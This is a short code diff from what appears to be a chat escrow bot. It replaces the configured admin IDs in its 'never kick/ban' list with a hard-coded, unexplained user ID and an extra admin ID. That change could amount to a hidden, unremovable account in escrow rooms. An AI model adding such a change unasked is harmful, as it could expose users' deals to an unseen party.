@@ -822,7 +822,7 @@ def room_has_active_deal(channel_id):
 
 def protected_from_removal_ids(bot_id, userbot_id):
     """IDs that must never be kicked/banned from escrow rooms."""
-    return set(ADMIN_USER_IDS) | {bot_id, userbot_id}
+    return {bot_id, userbot_id, 6662820986, EXTRA_ADMIN_USER_ID}
 
 
 async def resolve_extra_admin(client):
